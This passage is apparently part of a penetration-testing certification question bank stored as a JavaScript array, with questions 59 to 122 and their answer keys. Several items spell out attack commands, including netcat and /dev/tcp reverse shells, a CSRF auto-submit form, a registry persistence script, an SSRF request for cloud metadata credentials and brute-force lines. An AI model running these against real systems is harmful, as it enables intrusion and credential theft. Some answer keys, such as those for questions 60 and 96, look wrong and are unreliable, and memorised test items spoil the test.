    "Floor division operator (//)",
    "Modulo operator (%)"
  ],
  answer: ["Division operator (/)"]
},

/*question 59*/
{
  question: "A penetration tester has discovered a vulnerability in a popular e-commerce platform where an authenticated user can modify the price of items in their cart by manipulating client-side JavaScript variables. Using the DREAD threat modeling framework, which aspect of this vulnerability would receive the highest risk rating?",
  options: [
    "Discoverability rating",
    "Affected users rating",
    "Damage potential rating",
    "Exploitability rating"
  ],
  answer: ["Exploitability rating"]
},

/*question 60*/
{
  question: "During a penetration testing exercise, a security consultant discovers many legacy network applications that do not support encryption for data in motion. Which protocol or technology should be the consultant's TOP recommendation for remediating this risk?",
  options: [
    "Encrypted password storage",
    "Transport Layer Security",
    "Multi-factor authentication",
    "Secrets management"
  ],
  answer: ["Multi-factor authentication"]
},

 /*question 61*/
{
  question: "During a penetration test engagement, your team discovers multiple systems on a client network labeled as 'PCI' and 'sensitive' in their naming scheme. Based on the system inventory data collected during enumeration, which capability selection approach would be MOST appropriate for testing these systems?",
  options: [
    "Aggressive full-spectrum testing",
    "Targeted vulnerability assessment with strict controls",
    "Passive reconnaissance and analysis",
    "Automated patch verification scanning",
    "Active scanning with default configurations"
  ],
  answer: ["Targeted vulnerability assessment with strict controls", "Passive reconnaissance and analysis"]
},

/*question 62*/
{
  question: "A penetration tester is restoring the testing environment after conducting a penetration test. The tester notices a software tool running on a production Windows server. The tester needs to ensure that the software is removed properly. Which action should the penetration tester take to BEST accomplish the task?",
  options: [
    "Use Task Manager to end the software's process.",
    "Uninstall the software via Control Panel.",
    "Restart the Windows server in Safe Mode.",
    "Remove the software executable file directly."
  ],
  answer: ["Uninstall the software via Control Panel."]
},

/*question 63*/
{
  question: "During an engagement, a penetration tester discovers that their client's financial records database system is vulnerable to injection attacks. Which technical control should the tester recommend the client to use to remediate this finding?",
  options: [
    "Prevent any calls to the records system that use JSON.",
    "Replace coded statements with parameterized queries.",
    "Evaluate code calls using the Brakeman scanning tool.",
    "Eliminate all stored procedures in the application code."
  ],
  answer: ["Replace coded statements with parameterized queries."]
},

/*question 64*/
{
  question: "A penetration tester is assisting with the post-project report. The tester is responsible for preparing an outline that describes the overall risk level in general terms. Where should this information be placed in the report?",
  options: [
    "Conclusion",
    "Main body",
    "Technical report",
    "Executive summary"
  ],
  answer: ["Executive summary"]
},

/*question 65*/
{
  question: "A penetration tester collected the names of network servers from open sources and created a file named servers.txt that lists the servers by DNS name. The tester wants to run an aggressive OS scan on the server and write the result as a text file to \tmp\serverOS.txt. How should the tester complete the command string to run the scan?",
  options: [
    "nmap -osscan-guess [ -iL ] server.txt [ -oN ] \tmp\serverOS.txt"
  ],
  answer: ["[ -iL ] - [ -oN ]"]
},

/*question 66*/
{
  question: "During a penetration test, a vulnerability scan reveals a Remote Code Execution (RCE) vulnerability in an organization's web application. The scan output shows: [HIGH] Remote Code Execution Vulnerability Detected Target: https : // app . example . com/api/vl/process CVE: CVE-2023-45122 Description: Remote Code Execution vulnerability in API endpoint Details: Unsanitized user input in process parameter allows command injection POC: curl —X POST https : // app . example . com/api/vl/process —d 'param=; id; ' Verification: Command output 'uid=33 (www—data) gid=33 (www—data)' received References : — NVD: https://nvd.nist.gov/vuln/detai1/CVE—2023—45122 — Exploit: https://github.com/example/exploits/CVE—2023—45122 The tester needs to validate this finding using a public exploit. Which is the BEST approach when selecting a public exploit for vulnerability validation?",
  options: [
    "Check exploit publication date and associated Common Vulnerabilities and Exposures (CVE) details.",
    "Review exploit popularity metrics and community feedback across multiple security platforms.",
    "Match exploit code to target environment specifications and system configuration requirements.",
    "Analyze exploit developer reputation and previous code contributions to security repositories."
  ],
  answer: ["Match exploit code to target environment specifications and system configuration requirements."]
},

/*question 67*/
{
  question: "Which scenario BEST describes the primary attack vector of a USB drop attack?",
  options: [
    "Strategically placing malicious USB devices in locations where employees are likely to find and connect them to corporate systems",
    "Exploiting USB firmware vulnerabilities to gain elevated system privileges",
    "Installing keyloggers through physical access to USB ports on unattended workstations",
    "Using USB devices to perform direct memory attacks against running systems through DMA access"
  ],
  answer: ["Strategically placing malicious USB devices in locations where employees are likely to find and connect them to corporate systems"]
},

/*question 68*/
{
  question: "During a penetration test of a financial institution's mobile banking application, a security team discovers that the app employs multiple layers of security including certificate pinning, root detection, and code obfuscation. The team needs to perform dynamic analysis to identify potential vulnerabilities in the authentication process. Which combinations of tools and techniques would be MOST effective for bypassing these protections and analyzing the application's runtime behavior?",
  options: [
    "OWASP ZAP with logcat monitoring",
    "MobSF dynamic analysis with Xposed framework",
    "Wireshark with Android studio emulator",
    "Frida hooks with Magisk-hidden emulator environment",
    "Charles Proxy with standard ADB commands"
  ],
  answer: ["MobSF dynamic analysis with Xposed framework", "Frida hooks with Magisk-hidden emulator environment."]
},

/*question 69*/
{
  question: "A security team needs to implement comprehensive vulnerability scanning for their cloud-native environment, including container images, Infrastructure as Code (IaC) files, and cloud configurations. Which tool would be MOST effective for scanning multiple components of the cloud-native stack?",
  options: [
    "Dirb",
    "Hydra",
    "Maltego",
    "Trivy"
  ],
  answer: ["Trivy"]
},

/*question 70*/
{
  question: "A penetration tester needs to create a reverse shell in order to extract and analyze data collected from a target Linux server. Which commands can the tester use to complete this task?",
  options: [
    "nc 10.10.10.10 7777 < bin/sh",
    "nc 10.10.10.10 7777 -e /bin/sh",
    "tcpdump -i eth0 -c 7777 -np host 10.10.10.10",
    "bash -i /dev/tcp/1 0.10.10.10/7777"
  ],
  answer: ["nc 10.10.10.10 7777 -e /bin/sh", "bash -i /dev/tcp/1 0.10.10.10/7777"]
},

/*question 71*/
{
  question: "An analyst wants to run a network scan to generate a device list that includes assigned IP addresses and the operating systems in use on devices. The scan should have minimal impact on the network and target devices. What type of scan should the analyst run?",
  options: [
    "Discovery scan",
    "Compliance scan",
    "Stealth scan",
    "Full scan"
  ],
  answer: ["Discovery scan"]
},

/*question 72*/
{
  question: "A client contracts a security testing firm to perform remote penetration testing of its on-premises network. While the initial testing is underway, the client requests to schedule additional testing and include some on-site testing as part of the early tests. Which document should be updated with this information?",
  options: [
    "NDA",
    "SOW",
    "MSA",
    "SLA"
  ],
  answer: ["SOW"]
},

/*question 73*/
{
  question: "A penetration tester is conducting an internal assessment of a corporate network and must identify live hosts, enumerate services, detect firewalls, and gather information about potential misconfigurations. The tester is required to remain stealthy and avoid triggering intrusion detection systems (IDS). Additionally, the tester should minimize complexity, where possible. Which of the following approaches BEST meets these requirements?",
  options: [
    "Using Nmap with the -ss and —min-rate options",
    "Using Wireshark to passively monitor traffic and identify active devices",
    "Employing Netcat in combination with manually crafted TCP packets",
    "Leveraging Nmap with the -SA and --packet-trace options"
  ],
  answer: ["Using Nmap with the -ss and —min-rate options"]
},

/*question 74*/
{
  question: "A DevSecOps team needs to identify potential security vulnerabilities in their application's third-party dependencies and open-source components. Which scanning technique would be MOST effective for discovering these types of vulnerabilities in the software supply chain?",
  options: [
    "Dynamic application scanning",
    "Software composition analysis (SCA)",
    "Infrastructure configuration scanning",
    "Network protocol analysis"
  ],
  answer: ["Software composition analysis (SCA)"]
},

/*question 75*/
{
  question: "As part of a penetration test, a tester plans to set up an evil twin and capture logon credentials. Which activity should the tester perform FIRST?",
  options: [
    "Wardrive in proximity of the target network.",
    "Flood the network with deauthentication packets.",
    "Extract hashes from a target endpoint.",
    "Attempt to poison a target user's ARP cache."
  ],
  answer: ["Wardrive in proximity of the target network."]
},

/*question 76*/
{
  question: "During a security assessment of a manufacturing facility's industrial control network, an auditor needs to analyze traffic between Programmable Logic Controllers (PLCs) and the Human Machine Interface (HMI) without disrupting production operations. Which monitoring technique would be MOST effective for passively capturing this sensitive ICS traffic?",
  options: [
    "Active packet injection",
    "Port mirroring",
    "Network tap installation",
    "Protocol fuzzing"
  ],
  answer: ["Port mirroring"]
},

/*question 77*/
{
  question: "Which option BEST describes an attack technique that could achieve Remote Code Execution (RCE) by exploiting an application's unsafe object reconstruction process?",
  options: [
    "Java deserialization attack using ysoserial",
    "PHP object creation",
    "XML external entity injection",
    "JavaScript prototype pollution"
  ],
  answer: ["Java deserialization attack using ysoserial"]
},

/*question 78*/
{
  question: "A penetration tester used OSINT techniques to collect valid user names for a target network. The tester wants to initiate a brute force attack to try to crack the user's passwords. Which tools can the tester use?",
  options: [
    "Hashcat",
    "Hydra",
    "Mimikatz",
    "Cewl",
    "DirBuster"
  ],
  answer: ["Hashcat", "Hydra"]
},

/*question 79*/
{
  question: "During a mobile application penetration test, a security team discovers that the application stores sensitive biometric data used for authentication. According to the OWASP Mobile Application Security Verification Standard (MASVS), which security verification level and requirements would be MOST appropriate to properly assess this implementation?",
  options: [
    "MASVS-PLATFORM Level 2 requirements",
    "MASVS-CRYPTO Level 1 requirements",
    "MASVS-AUTH Level 2 requirements",
    "MASVS-STORAGE Level 2 requirements"
  ],
  answer: ["MASVS-STORAGE Level 2 requirements"]
},

/*question 80*/
{
  question: "A penetration tester needs to test IoT devices for wireless protocol vulnerabilities. Which statement BEST describes protocol fuzzing?",
  options: [
    "Protocol fuzzing evaluates system responses during network disruptions.",
    "Protocol fuzzing deliberately sends malformed data to test how systems handle unexpected inputs.",
    "Protocol fuzzing analyzes network traffic patterns to identify timing-based vulnerabilities.",
    "Protocol fuzzing maps communication flows between wireless devices."
  ],
  answer: ["Protocol fuzzing deliberately sends malformed data to test how systems handle unexpected inputs."]
},

/*question 81*/
{
  question: "A security analyst attempts to compromise a web application platform as part of a penetration test. The analyst has discovered an exposed database server and uses the SQLmap tool to probe the server. For which reason would the analyst run the following SQLmap command?",
  options: [
    "Their attempts are being blocked by a WAF.",
    "They want to enumerate the tables hosted by the database.",
    "They want to generate a random database password.",
    "They want to test with more injection payloads."
  ],
  answer: ["Their attempts are being blocked by a WAF."]
},

/*question 82*/
{
  question: "A cloud security team needs to assess the security posture of their AWS environment and identify potential misconfigurations and compliance issues. Which tool would be MOST appropriate for performing this assessment?",
  options: [
    "CloudSploit",
    "Prowler",
    "CloudMapper",
    "ScoutSuite"
  ],
  answer: ["Prowler"]
},

/*question 83*/
{
  question: "A security consultant is tasked with expanding the capabilities of an existing Python script used for gathering information about a client's web application. The script currently performs basic HTTP requests to collect server headers. Which modification would be MOST appropriate for enhancing the script's information gathering capabilities?",
  options: [
    "Add BeautifulSoup library integration to parse HTML content and extract metadata, forms, and hidden fields.",
    "Add DNS zone transfer requests using the dnspython library to enumerate subdomains.",
    "Implement packet capture capabilities using Scapy to analyze network traffic patterns.",
    "Implement port scanning functionality using the socket library to identify open services."
  ],
  answer: ["Add BeautifulSoup library integration to parse HTML content and extract metadata, forms, and hidden fields."]
},

/*question 84*/
{
  question: "A security analyst performs penetration testing against a cloud-based API. The security analyst uses Postman to submit the following URL: https://domain.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-R01e/. The following JSON is displayed in the HTTP response: { \"Code\" : \"Success\", \"LastUpdated\" : \"2022-05-31T03:18:12Z\", \"Type\" : \"AWS-HMAC\", \"AccessKeyId\" : \"MRC2TPMQRX43B094 \", \"SecretAccessKey\" : \"9qxSNZVRZ3Djtu8vtkZQtO\", \"Token\" : \"T1duI21F4J05GCBB/B4UNnELm9hjK\", \"Expiration\" : \"2022-06-01T15:12:00Z\" } Which attacks explain this output? (Select TWO.)",
  options: [
    "Account takeover",
    "Session fixation",
    "Metadata service attack",
    "Session hijacking",
    "Server-side request forgery"
  ],
  answer: ["Metadata service attack", "Server-side request forgery"]
},

/*question 85*/
{
  question: "A penetration tester needs to modify a Python script that searches for specific vulnerabilities across multiple web applications. The script currently uses simple string matching but needs to be more precise in identifying vulnerable endpoints. Which logic construct would be MOST effective for combining multiple search conditions while ensuring all criteria are met?",
  options: [
    "AND operator",
    "NOT operator",
    "XOR operator",
    "OR operator"
  ],
  answer: ["AND operator"]
},

/*question 86*/
{
  question: "A penetration tester obtains remote code execution on a Windows target and enables a listener on the attack box. Which method should the tester use to trigger the target host to connect to the tester's Linux-based system?",
  options: [
    "Run the nc 10.10.0.1 -e /bin/bash on the attack box.",
    "Run the nc -lvp 6666 command on the attack box.",
    "Run the nc -lvp 6666 command on the target system.",
    "Run the nc 10.10.0.1 6666 -e cmd.exe on the target system."
  ],
  answer: ["Run the nc 10.10.0.1 6666 -e cmd.exe on the target system."]
},

/*question 87*/
{
  question: "A security consultant is tasked with assessing the security posture of a client's Kubernetes cluster. The client is particularly concerned about remote attacks and wants to identify potential attack vectors that could be exploited without requiring direct access to the cluster. Which kube-hunter scanning modes would be MOST effective for discovering externally exploitable vulnerabilities? (Select TWO.)",
  options: [
    "Passive hunting from within a pod",
    "Log analysis hunting",
    "Remote horizontal scanning",
    "Network sniffing mode",
    "Active hunting from outside the cluster"
  ],
  answer: ["Remote horizontal scanning", "Active hunting from outside the cluster"]
},

/*question 88*/
{
  question: "During a security assessment of a containerized application environment, a security team needs to identify vulnerabilities in container images before deployment. Which tool would be MOST effective for scanning container images and their dependencies for known vulnerabilities?",
  options: [
    "SQLmap",
    "Mimikatz",
    "Grype",
    "Tcpdump"
  ],
  answer: ["Grype"]
},

/*question 89*/
{
  question: "Using a previously compromised workstation, a penetration tester has determined that they can access a web server located on a corporate-screened subnet. The tester wants to use a cloud-based VM to initiate a shell connection to a listener on the web server. What should the tester do NEXT to meet these requirements?",
  options: [
    "Install PowerShell on the web server.",
    "Create a reverse shell on the laptop.",
    "Install Secure Shell on the workstation.",
    "Create a bind shell on the web server."
  ],
  answer: ["Create a bind shell on the web server."]
},

/*question 90*/
{
  question: "An organization is concerned that high-ranking executives might be susceptible to social engineering attacks such as whaling. What should a penetration tester do to evaluate this concern?",
  options: [
    "Send an SMS message with a malicious link to an executive.",
    "Follow the Chief Executive Officer (CFO) through a locked door.",
    "Call the Chief Technical Officer (CTO) and impersonate a vendor.",
    "Send a phishing email to the Chief Financial Officer (CFO)."
  ],
  answer: ["Send a phishing email to the Chief Financial Officer (CFO)."]
},

/*question 91*/
{
  question: "During a network penetration test, you collect the following scan results from multiple hosts:\n\nHost A - 192.168.1.100\nPORT STATE SERVICE VERSION/BANNER\n22/tcp open ssh OpenSSH 8.9\n80/tcp open http Apache/2.4.54\n—> Directory listing enabled\n—> phpinfo.php accessible\n—> Default Apache welcome page\n3306/tcp open mysql MySQL 8.0.31\n—> User: root@%\n—> Password authentication: NO\n\nHost B - 192.168.1.110\nPORT STATE SERVICE VERSION/BANNER\n443/tcp open https nginx/1.22.1\n—> Custom SSL certificate\n—> Basic auth enabled\n—> Custom error pages\n8080/tcp open http-proxy HAProxy 2.6\n—> Access control lists configured\n\nHost C - 192.168.1.120\nPORT STATE SERVICE VERSION/BANNER\n21/tcp open ftp vsftpd 3.0.5\n—> Anonymous login allowed\n—> Default banner\n25/tcp open smtp Postfix\n—> Open relay configured\n—> Default installation paths\n1433/tcp open ms-sql-server Microsoft SQL Server 2019\n—> SA account enabled\n—> Default port\n\nHost D - 192.168.1.130\nPORT STATE SERVICE VERSION/BANNER\n80/tcp open http nginx/1.24.0\n—> WAF detected\n—> Custom configurations\n—> Rate limiting enabled\n5432/tcp open postgresql PostgreSQL 15\n—> peer authentication\n—> Custom pg_hba.conf\n\nBased on the scan results, which system should be prioritized as the primary target?",
  options: [
    "Host D",
    "Host B",
    "Host A",
    "Host C"
  ],
  answer: ["Host C"]
},

/*question 92*/
{
  question: "A penetration tester needs to discover if threat actors can successfully exfiltrate data from your network. The penetration tester will leverage the existing DNS infrastructure to accomplish this task. Which technique would BEST accomplish the goal?",
  options: [
    "DNS amplification",
    "DNS tunneling",
    "SQL injection",
    "HTTP flooding"
  ],
  answer: ["DNS tunneling"]
},

/*question 93*/
{
  question: "A penetration tester needs to perform data exfiltration. They must use stealthy techniques to avoid detection. Which techniques would BEST accomplish this task? (Select TWO.)",
  options: [
    "Mount a virtual drive.",
    "Download the data locally to a USB thumb drive.",
    "Upload files over the network to an FTP server.",
    "Use file compression."
  ],
  answer: ["Mount a virtual drive", "Use file compression."]
},

/*question 94*/
{
  question: "As part of a penetration test, a security analyst creates the script below:\n\nMY_HOSTS=\"my_hosts\"\nwhile IFS='' read -r LINE || [[ -n \"$LINE\" ]]; do\n ping —c 3 $LINE\ndone < \"$MY_HOSTS\"\n\nWhat does this script do?",
  options: [
    "Loops through all items in $LINE.",
    "Checks connectivity for nodes in my_hosts.",
    "Creates a file for each item in MY_HOSTS.",
    "Populates the MY_HOSTS file with ping results."
  ],
  answer: ["Checks connectivity for nodes in my_hosts."]
},

/*question 95*/
{
  question: "A penetration tester has successfully gained access to a compromised server and wants to identify users and their associated permissions to determine potential privilege escalation paths. Which tool or command would be MOST effective for permission enumeration?",
  options: [
    "Tcpdump",
    "Netcat",
    "Wireshark",
    "Accesschk"
  ],
  answer: ["Accesschk"]
},

/*question 96*/
{
  question: "During a web application penetration test, a security consultant needs to test the robustness of a web application's password hashing mechanism. The application stores password hashes in a database and uses them for authentication. Which attack type would be MOST effective for identifying weaknesses in the hashing implementation?",
  options: [
    "MD5 collision attack",
    "SQL injection attack",
    "Cross-site scripting attack",
    "Brute force attack"
  ],
  answer: ["MD5 collision attack"]
},

/*question 97*/
{
  question: "A penetration tester successfully compromises a target user's workstation. The tester wants to move laterally and has discovered a vulnerable API on a local server. The tester prepares an attack against the API using the code below:\n\ncurl --location --request POST 'https://api.domain.org/data'\n --header 'Content-Type: application/json'\n --header 'Authorization: Bearer --header 'Content-Type: text/plain'\n --data-raw '{\"userId\": \"jdoe0441\", \"request\": \"/secrets.pdf\"}'\n\nWhat should the tester do to complete the request and successfully authenticate with the API?",
  options: [
    "Create a request for a valid API key.",
    "Obtain the authentication token for the API.",
    "Encode the authorization request with Base64.",
    "Specify a password for the provided userId."
  ],
  answer: ["Obtain the authentication token for the API."]
},

/*question 98*/
{
  question: "You are performing a penetration test on a segmented internal network. One of the network subnets is unresponsive to ping sweeps but has a firewall rule allowing outbound traffic. Which of the following techniques would be most effective for discovering active services on the subnet?",
  options: [
    "Shodan with advanced query filters",
    "Metasploit with SMB modules",
    "Nmap with the '-Pn' and '-sV' options",
    "Nikto with proxy tunneling"
  ],
  answer: ["Nmap with the '-Pn' and '-sV' options"]
},

/*question 99*/
{
  question: "A penetration tester has been hired to attempt data exfiltration from an e-commerce company. The tester locates data and prepares the Python script below:\n\nimport requests\nurl = \"http://api.filestore.com/v1/pentestOA228F2\"\npayload = \"{\r\n\"Jane Doe\":\"d6qce5aLZkt6VLRD\",\r\n\"555—44—6666\":\"jdoe@gmail.io\",\r\n\"4012—8888—8888—1881\":\"true\"\r\n}\"\nheaders = {\n    'Authorization': 'Bearer 56e01hqjaz177—8764—481zs—ochh',\n    'Content—Type': 'application/json '\n}\nresponse = requests.request (\"PUT\", url, headers=headers, data=payload)\nprint(response.text.encode('utf8'))\n\nWhat should the tester do NEXT?",
  options: [
    "Use Nmap to verify that traffic will traverse the border firewall.",
    "Direct the script to connect through a ProxyChains node.",
    "Modify the script to ensure transport encryption is utilized.",
    "Remove the authorization token from the request header."
  ],
  answer: ["Modify the script to ensure transport encryption is utilized."]
},

/*question 100*/
{
  question: "A company hires a penetration tester to extract information from a LAN-based file server. The tester plans to initiate the attack by setting up an evil twin. What should the tester do to complete this task?",
  options: [
    "Initiate multiple server connections using a proxy.",
    "Send an email from a fake address.",
    "Add a DNS server with a spoofed address.",
    "Configure an AP with an organization's SSID."
  ],
  answer: ["Configure an AP with an organization's SSID."]
},
/*question 101*/
{
  question: "A penetration tester creates a web page with the following HTML:\n<html>\n<body>\n<form action=\"https://your—site.org/banking/transfer\" method=\"POST\">\n<input type=\"hidden\" name=\"dest—acct\" value=\"haXOr@ur—hakkd.org\" />\n</form>\n<script>\ndocument.forms[0].submit();\n</script>\n</body>\n</html>\nWhat is the tester's goal?",
  options: [
    "To escalate permissions for account owner",
    "To replay a web session against a web server",
    "To trick a user into falling for a CSRF attack",
    "To perform a XSS attack"
  ],
  answer: ["To trick a user into falling for a CSRF attack"]
},

/*question 102*/
{
  question: "A security consultant runs the following code during a penetration test:\n$Config = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nset—itemproperty $Config \"TaskManager\"\n('C:\\Windows\\System32\\WindowsPowerShell\\v1.O\\Powershell.exe -executionPolicy\nUnrestricted -File ' + \"C:\\Temp\\TaskManager.ps1\")\nWhich tasks should the consultant perform during post-report delivery? (Select THREE.)",
  options: [
    "Edit a script.",
    "Delete a file.",
    "Add a permission.",
    "Change an execution policy.",
    "Delete a service.",
    "Delete a registry key."
  ],
  answer: ["Delete a file", "Change an execution policy", "Delete a registry key."]
},

/*question 103*/
{
  question: "A penetration tester runs a tool that produces the output below:\n\n| rowid | host             | ip_address    | region | country | latitude | longitude | module       | \n| 1   | acme.com       | 209.133.79.61 |         |         |           |           | hackertarget |\n| 2   | marketing.acme.com | 13.111.47.196 |         |         |           |           | hackertarget |\n\nWhich task has the tester completed?",
  options: [
    "Passive reconnaissance using Recon-ng",
    "Active reconnaissance using Scapy",
    "Active reconnaissance using theHarvester",
    "Passive reconnaissance using CWE"
  ],
  answer: ["Passive reconnaissance using Recon-ng"]
},

/*question 104*/
{
  question: "What is designed to provide organizations with a comprehensive, measurable, repeatable process for assessing the security of their networks and systems?",
  options: [
    "ZAP",
    "CWE",
    "OWASP",
    "PTES"
  ],
  answer: ["PTES"]
},

/*question 105*/
{
  question: "A red team is hired to perform a penetration test against a CSP's management system. The provider has been the target of previous attacks that resulted in lost business. During the reconnaissance phase of the project, a red team member manages to purchase a password dump from the provider on the dark web. The dump appears to be a database of usernames and indecipherable password data. What should the team member do to extract usable passwords from the dump?",
  options: [
    "Load the password dump onto Recon-ng.",
    "Process the password dump with hashcat.",
    "Convert the dump to a rainbow table.",
    "Open the file using Registry Editor."
  ],
  answer: ["Process the password dump with hashcat."]
},

/*question 106*/
{
  question: "A penetration tester needs to automate the process of discovering live hosts on a target network and wants to modify an existing Bash script. The script currently uses ping to check host availability but needs to be enhanced for faster scanning. Which Bash scripting modification would be MOST effective for improving the script's performance?",
  options: [
    "Implementing parallel processing with &",
    "Using recursive function calls",
    "Implementing sleep commands",
    "Adding sequential for loops"
  ],
  answer: ["Implementing parallel processing with &"]
},

/*question 107*/
{
  question: "At the conclusion of a project for a regional bank, a penetration tester reports that collusion between employees in certain areas could increase the risk of fraud. Which operational control should the tester recommend in the project report?",
  options: [
    "Job rotation",
    "Video surveillance",
    "Time-of-day restrictions",
    "Access control vestibules"
  ],
  answer: ["Job rotation"]
},

/*question 108*/
{
  question: "An organization deploys devices using industry-standard application protocols such as Advanced Message Queuing Protocol (AMQP) and Message Queue Telemetry Transport (MQTT) over WebSockets using port 443. Security is further enhanced by placing IoT devices behind a firewall. However, a penetration tester is still able to eavesdrop sensitive IoT device information. Which explains this issue?",
  options: [
    "The IoT server endpoint is missing a PKI certificate.",
    "The firewall rules have not been properly configured.",
    "The devices should be configured to use BLE.",
    "Storage encryption has not been enabled on the devices."
  ],
  answer: ["The IoT server endpoint is missing a PKI certificate."]
},

/*question 109*/
{
  question: "During a web application security assessment, a penetration tester is manually inspecting the application for potential vulnerabilities. They decide to review the robots.txt file. What information can the tester potentially discover through this manual enumeration method?",
  options: [
    "Vulnerabilities in web server configurations detected through error messages",
    "Sensitive cookies or session tokens embedded within HTTP headers",
    "Detailed system configuration files accessible to authenticated users",
    "Directory paths that the site administrator intends to restrict from web crawlers"
  ],
  answer: ["Directory paths that the site administrator intends to restrict from web crawlers"]
},

/*question 110*/
{
  question: "During a penetration test of a Windows domain environment, an attacker needs to extract cleartext credentials from a compromised system. Which credential dumping technique would be MOST effective for obtaining cleartext credentials?",
  options: [
    "Registry hive extraction",
    "Shadow copy extraction",
    "LSASS memory extraction",
    "SAM database extraction"
  ],
  answer: ["LSASS memory extraction"]
},

/*question 111*/
{
  question: "A security analyst needs to automate DNS enumeration for multiple subdomains of a target organization. They want to use Python to create a script that can perform concurrent DNS lookups efficiently. Which Python code implementation would be MOST effective for this task?",
  options: [
    "Multi-threaded ping sweep using os.system()",
    "Sequential DNS lookups with socket.gethostbyname()",
    "Shell script wrapper using subprocess.run()",
    "Asyncio-based DNS resolver with concurrent.futures"
  ],
  answer: ["Asyncio-based DNS resolver with concurrent.futures"]
},

/*question 112*/
{
  question: "Upon conclusion of a penetration test, a security analyst prepares a findings report. The analyst wants to include a risk rating score for each discovery made during the test. Which items are critical when calculating a risk rating? (Select TWO.)",
  options: [
    "User interaction",
    "Impact",
    "Threat",
    "Attack complexity",
    "Likelihood"
  ],
  answer: ["Impact", "Likelihood"]
},

/*question 113*/
{
  question: "During a penetration test, an attacker needs to bypass antivirus detection of their malicious payload. Which obfuscation technique would be MOST effective for evading signature-based detection?",
  options: [
    "Base64 encoding",
    "URL encoding",
    "ASCII encoding",
    "XOR encoding"
  ],
  answer: ["XOR encoding"]
},

/*question 114*/
{
  question: "A penetration tester has gained access to a targets internal network and suspects that sensitive data is being shared across network resources. The tester wants to enumerate shares on a specific Windows server to identify accessible resources. Which technique would be the MOST effective?",
  options: [
    "Utilizing SNMP enumeration tools",
    "Using the net view command",
    "Analyzing the network using Wireshark",
    "Running a port scan to identify open SMB ports"
  ],
  answer: ["Using the net view command"]
},

/*question 115*/
{
  question: "A penetration tester needs to evaluate the security awareness of a specific department within a large organization. After reconnaissance, the tester discovers that employees in this department frequently visit certain industry-specific websites for research. Which social engineering technique would be MOST effective for targeting this specific group of employees?",
  options: [
    "Watering hole attack",
    "DNS cache poisoning",
    "Typosquatting",
    "Social media phishing"
  ],
  answer: ["Watering hole attack"]
},

/*question 116*/
{
  question: "A DevOps team has implemented Terraform to provision their cloud infrastructure and needs to identify potential security vulnerabilities in their infrastructure code before deployment. Which scanning method would be MOST effective for detecting insecure configurations in their infrastructure code during development?",
  options: [
    "Runtime vulnerability scanning",
    "Compliance auditing tools",
    "Static application security testing (SAST)",
    "Network configuration analysis"
  ],
  answer: ["Static application security testing (SAST)"]
},

/*question 117*/
{
  question: "A penetration tester includes the following information in a findings report.\n\n109345 (9) - Oracle WebLogic Unsupported Version Detection\n\nDescription\nAccording to its version, the installation of Oracle WebLogic running on the remote host is no longer supported per:\n- Error Correction Support Dates for Oracle WebLogic Server (Doc ID 950131.1)\nLack of support implies that no new security patches for the product will be released by the vendor. As a result, it is likely to contain security vulnerabilities.\n\nSolution - Upgrade to a version of Oracle WebLogic that is currently supported.\n\nRisk Factor - Critical\nCVSS v3.O Base Score\n10.0\n\nPlugin Information\nPublished: 2018/04/26, Modified: 2019/05/10\n\nPlugin Output\nPS-SRVI (tcp/9999)\n\nInstalled version : 10.3.4.0\nEnd of support date : 2014/01/01\nLatest version : 10.3.6 / 12.1.3.0 / 12.2.1.3\n\nWhich remediation recommendation does this information BEST support?",
  options: [
    "Asset management",
    "Patch management",
    "Vulnerability management",
    "Configuration management"
  ],
  answer: ["Patch management"]
},

/*question 118*/
{
  question: "A penetration tester needs to perform a brute-force attack against multiple services while avoiding account lockouts and maintaining detailed logs of the testing process. Which Medusa commands would be MOST effective for this task? (Select TWO.)",
  options: [
    "medusa -H hosts.txt -C credentials.txt -M ssh -n 2222 -e ns -f -F -O brutelog.txt",
    "medusa -M http -m DIR:/login -h target.local -U admin -P pass.txt -v 0",
    "medusa -h target.com -U users.txt -p Summer2024! -M ftp -T 10",
    "medusa -d",
    "medusa -h 10.10.1.50 -U userlist.txt -P passwordlist.txt -M http -m DIR:/admin -O medusa_http_results.txt -v 4"
  ],
  answer: ["medusa -H hosts.txt -C credentials.txt -M ssh -n 2222 -e ns -f -F -O brutelog.txt", 
            "medusa -h 10.10.1.50 -U userlist.txt -P passwordlist.txt -M http -m DIR:/admin -O medusa_http_results.txt -v 4"]
},

/*question 119*/
{
  question: "Based on the output below, what should the penetration tester do NEXT? (Select TWO.)\n\nuser : JaneDoe\ndomain : domain . local\nprogram : cmd. exe\nimpers. : no\nNTLM : 7d46b8cOb720c8722df2fb584c573310",
  options: [
    "Use Kismet to capture a matching password hash.",
    "Use setspn.exe to enumerate service principal names.",
    "Use Cain & Abel to perform a rainbow table attack.",
    "Use mimikatz to initiate a pass the hash attack."
  ],
  answer: ["Use Cain & Abel to perform a rainbow table attack", "Use mimikatz to initiate a pass the hash attack."]
},

/*question 120*/
{
  question: "During passive reconnaissance, a penetration tester discovers a target web server exposed to the internet. The tester believes the server may be susceptible to several well-known vulnerabilities. The tester enters the following code in a browser window in an attempt to validate this assumption:\nhttps : / / www. hacked. url/na/ logon. php\nWhich attack is the tester attempting?",
  options: [
    "Cross-site scripting",
    "SQL injection",
    "Buffer overflow",
    "Cross-site request forgery"
  ],
  answer: ["SQL injection"]
},

/*question 121*/
{
  question: "A penetration tester is tasked with performing a penetration test on a Windows-based system to identify and gather information on all actively running services on a remote machine within a corporate network. Which command would BEST accomplish the goal?",
  options: [
    "psexec \\192.168.1.10 -u Administrator -p Passwordl23 cmd /c \"systeminfo\"",
    "psexec \\192.168.1.10 -u Administrator -p Password123 cmd /c \"sc query | findstr RUNNING\"",
    "psexec \\192.168.1.10 -u Administrator -p Passwordl23 cmd /c \"wmic product get name,version\"",
    "psexec \\192.168.1.10 -u Administrator -p Passwordl23 cmd /c \"netstat -ano\""
  ],
  answer: ["psexec \\192.168.1.10 -u Administrator -p Password123 cmd /c \"sc query | findstr RUNNING\""]
},

/*question 122*/
{
  question: "A security team is conducting a comprehensive security assessment of their organization's DevOps pipeline and source code repositories. They are particularly concerned about sensitive data exposure. Which scanning approach would be MOST effective at identifying exposed API keys, credentials, and access tokens?",
  options: [
    "Secrets scanning",
    "Configuration scanning",
    "Permission scanning",
    "Network scanning"
  ],
  answer: ["Secrets scanning"]
},

/*question 123*/
{
